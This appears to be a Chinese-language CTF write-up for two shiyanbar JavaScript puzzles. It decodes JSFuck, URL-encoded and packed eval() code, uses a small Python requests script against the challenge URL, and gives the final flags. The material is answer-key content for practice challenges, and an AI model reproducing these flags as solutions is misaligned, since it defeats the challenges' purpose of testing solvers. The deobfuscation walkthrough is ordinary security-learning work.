`[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+[+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()` 控制台解码提示Hint:urlenode再仔细查看源码发现 var Words =&quot;%3Ccenter%3E%0A%0A%3Cp%3E%u4E0D%u96BE%u7684%uFF0C%u8F93%u5165%u5BC6%u7801%u8FA3%21%3C%2fp%3E%0A%0A%3Cscript%20language%3D%22JScript.Encode%22%3E%23@%7E%5EEwAAAA%3D%3DC%5E%2b.D%60rt%2b%5EVKE%23p@%23@%26EwUAAA%3D%3D%5E%23%7E@%0A%0A%3C%21--%0A%09%2f%2f%2a%2a%2a%28%u3065%uFFE3%203%uFFE3%29%u3065%u6211%u8981%u62B1%u62B1%21%21%21%2a%2a%2a%0Aeval%28function%28p%2Ca%2Cc%2Ck%2Ce%2Cd%29%7Be%3Dfunction%28c%29%7Breturn%28c%3Ca%3F%22%22%3Ae%28parseInt%28c%2fa%29%29%29%2b%28%28c%3Dc%25a%29%3E35%3FString.fromCharCode%28c%2b29%29%3Ac.toString%2836%29%29%7D%3Bif%28%21%27%27.replace%28%2f%5E%2f%2CString%29%29%7Bwhile%28c--%29d%5Be%28c%29%5D%3Dk%5Bc%5D%7C%7Ce%28c%29%3Bk%3D%5Bfunction%28e%29%7Breturn%20d%5Be%5D%7D%5D%3Be%3Dfunction%28%29%7Breturn%27%5C%5Cw%2b%27%7D%3Bc%3D1%3B%7D%3Bwhile%28c--%29if%28k%5Bc%5D%29p%3Dp.replace%28new%20RegExp%28%27%5C%5Cb%27%2be%28c%29%2b%27%5C%5Cb%27%2C%27g%27%29%2Ck%5Bc%5D%29%3Breturn%20p%3B%7D%28%27%3C%21--v%20p%28%29%7B6%208%3Dh.o.e.n%3B6%202%3D%22q%3D%3D%22%3B6%20a%3D%5C%27t.s%3Fe%3D%5C%27%3B6%20d%3Dj.r%3B6%20k%3D%5C%27%5C%27%3B6%20g%3D2.9%28m%2C4%2a4%29%2b2.9%28l%2C5%2a5%29%2b2.9%280%2C1%29%2b2.b%287%2C1%29%2b2.b%28z%2C1%29%2b2.b%28B%2C1%29%2b2.9%283%2b3%2C7%29%3B8%3Dd.b%28d.f%28%5C%27%3F%5C%27%29%2b1%29%3Ba%3Da.9%280%2Ca.f%28%5C%27%3F%5C%27%29%2b1%29%2b%5C%27A%3D%5C%27%3Bw%28i%3D0%3Bi%3C8.y%3Bi%2b%2b%29%7Bx%288.c%28i%29%3D%3Dg.c%28i%29%29%7Bh.u%288.c%28i%29%29%7D%7Dj%3Da%2b8%7D--%3E%27%2C38%2C38%2C%27%7C%7Ccry%7C%7C%7C%7Cvar%7C%7Cpass%7Csubstring%7Caddr%7Csubstr%7CcharAt%7Clocatie%7Cpasswd%7CindexOf%7Cpass2%7Cdocument%7C%7Clocation%7Cout%7C24%7C15%7Cvalue%7Cform%7Czhegejiamiyidiandoubuku%7CRm9yM0re354v5E4FUg5FasDboooo%7Chref%7Cphp%7Csoroki%7Cwrite%7Cfunction%7Cfor%7Cif%7CLen%7C11%7Cl0vau%7C13%27.split%28%27%7C%27%29%2C0%2C%7B%7D%29%29%0A--%3E%0A%3C%2fscript%3E%0A%0A%3Cform%20name%3D%22form%22%3E%0APassword%3A%20%3Cinput%20type%3D%22password%22%20name%3D%22passwd%22%3E%20%3Cinput%20type%3D%22button%22%20value%3D%22boom%21%21%21%21%22%20onClick%3D%22zhegejiamiyidiandoubuku%28%29%22%3E%0A%3C%2fform%3E%0A%0A%3C%2fcenter%3E&quot;; urldecode得到123456789101112&lt;center&gt;&lt;p&gt;不难的，输入密码辣!&lt;/p&gt;&lt;script language=\"JScript.Encode\"&gt;#@~^EwAAAA==C^+.D`rt+^VKE#p@#@&amp;EwUAAA==^#~@&lt;!-- //***(づ￣ 3￣)づ我要抱抱!!!***eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?\"\":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;&#125;('&lt;!--v p()&#123;6 8=h.o.e.n;6 2=\"q==\";6 a=\\'t.s?e=\\';6 d=j.r;6 k=\\'\\';6 g=2.9(m,4*4)+2.9(l,5*5)+2.9(0,1)+2.b(7,1)+2.b(z,1)+2.b(B,1)+2.9(3+3,7);8=d.b(d.f(\\'?\\')+1);a=a.9(0,a.f(\\'?\\')+1)+\\'A=\\';w(i=0;i&lt;8.y;i++)&#123;x(8.c(i)==g.c(i))&#123;h.u(8.c(i))&#125;&#125;j=a+8&#125;--&gt;',38,38,'||cry||||var||pass|substring|addr|substr|charAt|locatie|passwd|indexOf|pass2|document||location|out|24|15|value|form|zhegejiamiyidiandoubuku|Rm9yM0re354v5E4FUg5FasDboooo|href|php|soroki|write|function|for|if|Len|11|l0vau|13'.split('|'),0,&#123;&#125;))--&gt;&lt;/script&gt;&lt;form name=\"form\"&gt;Password: &lt;input type=\"password\" name=\"passwd\"&gt; &lt;input type=\"button\" value=\"boom!!!!\" onClick=\"zhegejiamiyidiandoubuku()\"&gt;&lt;/form&gt;&lt;/center&gt; 经过网站解密:https://www.sojson.com/jsjiemi.html12345678910111213141516171819202122232425&lt;!--function zhegejiamiyidiandoubuku()&#123; var pass=document.form.passwd.value; var cry=\"Rm9yM0re354v5E4FUg5FasDboooo==\"; var addr='soroki.php?passwd='; var locatie=location.href; var out=''; var pass2=cry.substring(15,4*4)+cry.substring(24,5*5)+cry.substring(0,1)+cry.substr(7,1)+cry.substr(11,1)+cry.substr(13,1)+cry.substring(3+3,7); pass=locatie.substr(locatie.indexOf('?')+1);addr=addr.substring(0,addr.indexOf('?')+1)+'l0vau='; for(i=0;i&lt;pass.Len;i++)&#123; if(pass.charAt(i)==pass2.charAt(i)) &#123; document.write(pass.charAt(i)) &#125; &#125;location=addr+pass &#125;--&gt;``` 将以下代码放置控制台运行```javascript var cry=\"Rm9yM0re354v5E4FUg5FasDboooo==\"; var addr='soroki.php?passwd='; var locatie=location.href; var out=''; var pass2=cry.substring(15,4*4)+cry.substring(24,5*5)+cry.substring(0,1)+cry.substr(7,1)+cry.substr(11,1)+cry.substr(13,1)+cry.substring(3+3,7); pass=locatie.substr(locatie.indexOf('?')+1);addr=addr.substring(0,addr.indexOf('?')+1)+'l0vau='; \"soroki.php?l0vau=\" 得到soroki.php?l0vau= 编写python代码12345678910 #-*- coding:utf-8 -*-import requestscry=\"Rm9yM0re354v5E4FUg5FasDboooo==\"addr='soroki.php?passwd='locatie=\"http://ctf5.shiyanbar.com/crypto/4/\"pass2=cry[15:16]+cry[24:25]+cry[0:1]+cry[7:8]+cry[11:12]+cry[13:14]+cry[6:7]addr=addr[:addr.index('?')+1]+'l0vau='location=locatie+addr+pass2print locationhtml=requests.get(location) 得到http://ctf5.shiyanbar.com/crypto/4/soroki.php?l0vau=FoRevEr得到aW4yIHNheTpJIGxvdmUgeW91IEZvcmV2ZXIhVGhlIEdpcmwgc2F5OiB6cWN7ZmtxdGxfZnBfeWZkX3B5fQ==解密in2 say:I love you Forever!The Girl say: zqc{fkqtl_fp_yfd_py}flag:ctf{intwo_is_big_sb} js小明某天在看js的时候，突然看到了这么一段代码，发现怎么也理不出代码逻辑，你能帮帮他吗？格式：SimCTF{}解题链接： http://ctf5.shiyanbar.com/crypto/2.html 一定要在查看源码中复制代码,把下面eval转换为console.log再放到控制台中运行12345eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?\"\":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;&#125;('&lt;1 8=\"7/a\"&gt;9(\\'\\\\6\\\\3\\\\2\\\\5\\\\4\\\\b\\\\i\\\\h\\\\k\\\\j\\\\0\\\\g\\\\d\\\\c\\\\f\\\\0\\\\e\\')&lt;/1&gt;',21,21,'u0065|script|u006d|u0069|u0054|u0043|u0053|text|type|alert|javascript|u0046|u006f|u0063|u007d|u0064|u006e|u006a|u007b|u005f|u0073'.split('|'),0,&#123;&#125;))得到&lt;script type=\"text/javascript\"&gt;alert('\\u0053\\u0069\\u006d\\u0043\\u0054\\u0046\\u007b\\u006a\\u0073\\u005f\\u0065\\u006e\\u0063\\u006f\\u0064\\u0065\\u007d')&lt;/script&gt; 解密：http://tool.chinaz.com/tools/unicode.aspx","categories":[],"tags":[{"name":"writeup 